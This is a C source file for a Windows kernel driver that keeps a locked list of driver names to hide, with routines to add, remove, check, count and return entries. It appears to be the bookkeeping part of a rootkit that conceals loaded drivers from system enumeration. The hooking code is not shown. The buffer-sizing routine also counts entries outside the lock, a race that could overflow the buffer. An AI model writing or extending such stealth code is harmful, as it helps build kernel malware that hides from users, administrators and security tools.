#include "..\..\includes\shared.h"
#include "..\..\includes\driver_defs.h"

LIST_ENTRY g_driver_list;
KSPIN_LOCK g_driver_lock;

void driver_hide_init(void)
{
    InitializeListHead(&g_driver_list);
    KeInitializeSpinLock(&g_driver_lock);
}

void driver_hide_cleanup(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_driver_entry de;

    KeAcquireSpinLock(&g_driver_lock, &irql);
    while (!IsListEmpty(&g_driver_list)) {
        entry = RemoveHeadList(&g_driver_list);
        de = CONTAINING_RECORD(entry, hidden_driver_entry, list);
        ExFreePool(de);
    }
    KeReleaseSpinLock(&g_driver_lock, irql);
}

NTSTATUS driver_hide_add(PCWSTR name)
{
    phidden_driver_entry de;
    KIRQL irql;
    UNICODE_STRING us;

    de = (phidden_driver_entry)ExAllocatePoolWithTag(NonPagedPool, sizeof(hidden_driver_entry), 'drch');
    if (!de) return STATUS_INSUFFICIENT_RESOURCES;
    RtlZeroMemory(de, sizeof(hidden_driver_entry));
    RtlInitUnicodeString(&us, name);
    if (us.Length > (sizeof(de->name) - sizeof(WCHAR))) us.Length = (USHORT)(sizeof(de->name) - sizeof(WCHAR));
    if (us.Length > 0) RtlCopyMemory(de->name, name, us.Length);
    KeAcquireSpinLock(&g_driver_lock, &irql);
    InsertTailList(&g_driver_list, &de->list);
    KeReleaseSpinLock(&g_driver_lock, irql);
    return STATUS_SUCCESS;
}

NTSTATUS driver_hide_remove(PCWSTR name)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_driver_entry de;
    UNICODE_STRING us, de_us;

    RtlInitUnicodeString(&us, name);
    KeAcquireSpinLock(&g_driver_lock, &irql);
    for (entry = g_driver_list.Flink; entry != &g_driver_list; entry = entry->Flink) {
        de = CONTAINING_RECORD(entry, hidden_driver_entry, list);
        RtlInitUnicodeString(&de_us, de->name);
        if (RtlCompareUnicodeString(&de_us, &us, TRUE) == 0) {
            RemoveEntryList(&de->list);
            KeReleaseSpinLock(&g_driver_lock, irql);
            ExFreePool(de);
            return STATUS_SUCCESS;
        }
    }
    KeReleaseSpinLock(&g_driver_lock, irql);
    return STATUS_NOT_FOUND;
}

BOOLEAN driver_hide_check(PCUNICODE_STRING name)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_driver_entry de;
    UNICODE_STRING de_us;
    BOOLEAN found = FALSE;

    KeAcquireSpinLock(&g_driver_lock, &irql);
    for (entry = g_driver_list.Flink; entry != &g_driver_list; entry = entry->Flink) {
        de = CONTAINING_RECORD(entry, hidden_driver_entry, list);
        RtlInitUnicodeString(&de_us, de->name);
        if (RtlCompareUnicodeString(&de_us, name, TRUE) == 0) {
            found = TRUE;
            break;
        }
    }
    KeReleaseSpinLock(&g_driver_lock, irql);
    return found;
}

ULONG driver_hide_count(void)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    ULONG count = 0;

    KeAcquireSpinLock(&g_driver_lock, &irql);
    for (entry = g_driver_list.Flink; entry != &g_driver_list; entry = entry->Flink)
        count++;
    KeReleaseSpinLock(&g_driver_lock, irql);
    return count;
}

NTSTATUS driver_hide_list(PVOID buffer, ULONG size, PULONG needed)
{
    KIRQL irql;
    PLIST_ENTRY entry;
    phidden_driver_entry de;
    pdriver_request dr = (pdriver_request)buffer;
    ULONG count = 0;

    *needed = driver_hide_count() * sizeof(driver_request);
    if (size < *needed) return STATUS_BUFFER_TOO_SMALL;
    KeAcquireSpinLock(&g_driver_lock, &irql);
    for (entry = g_driver_list.Flink; entry != &g_driver_list; entry = entry->Flink) {
        de = CONTAINING_RECORD(entry, hidden_driver_entry, list);
        RtlCopyMemory(dr[count].name, de->name, sizeof(de->name));
        count++;
    }
    KeReleaseSpinLock(&g_driver_lock, irql);
    return STATUS_SUCCESS;
}
